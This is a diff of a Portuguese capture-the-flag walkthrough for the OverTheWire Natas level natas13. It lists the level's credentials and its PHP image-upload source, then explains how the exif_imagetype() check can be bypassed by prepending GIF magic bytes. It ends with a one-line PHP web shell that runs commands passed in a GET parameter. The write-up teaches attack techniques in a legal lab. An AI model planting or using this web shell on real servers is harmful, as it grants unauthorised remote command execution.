@@ -455,3 +455,101 @@ Após editar o formulário e alterar a extensão para `.php`, realizamos o uploa
 
 > credenciais: natas13 / trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
 
+O nivel possui o seguinte enunciado:
+
+<img width="749" height="285" alt="Captura de tela 2025-12-01 231915" src="https://github.com/user-attachments/assets/ef01722f-12ad-44d9-9c1c-6af3ad4f665e" />
+
+Seu código-fonte é similar ao anterior, mas adiciona uma verificação de segurança usando a função `exif_imagetype()` do PHP, para garantir que o arquivo enviado seja realmente uma imagem.
+
+```
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas13", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas13</h1>
+<div id="content">
+For security reasons, we now only accept image files!<br/><br/>
+
+<?php
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+    $err=$_FILES['uploadedfile']['error'];
+    if($err){
+        if($err === 2){
+            echo "The uploaded file exceeds MAX_FILE_SIZE";
+        } else{
+            echo "Something went wrong :/";
+        }
+    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+<?php } ?>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+```
+A função `exif_imagetype()` realiza uma verificação simples para garantir que o arquivo enviado seja realmente uma imagem. Ela não analisa o conteúdo completo do arquivo, mas apenas os primeiros bytes — conhecidos como [magic bytes](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5) — que funcionam como uma assinatura única de cada formato.
+
+<img width="1062" height="70" alt="Captura de tela 2025-12-02 151317" src="https://github.com/user-attachments/assets/40d32741-49b9-4ed2-b75a-1cb9a98ad637" />
+
+Esses magic bytes permitem identificar extensões comuns como GIF, JPEG, PNG, entre outras. Assim, podemos criar um arquivo utilizando apenas os magic bytes para burlar a verificação da página, já que a função `exif_imagetype()` confere apenas os primeiros bytes do arquivo.
+
+Para isso, utilizamos o seguinte código PHP:
+
+`GIF87a<?php echo shell_exec($_GET['e'].' 2>&1'); ?>`
+
+> A assinatura GIF87a  de um __GIF (Graphics Interchange Format)__. 
+
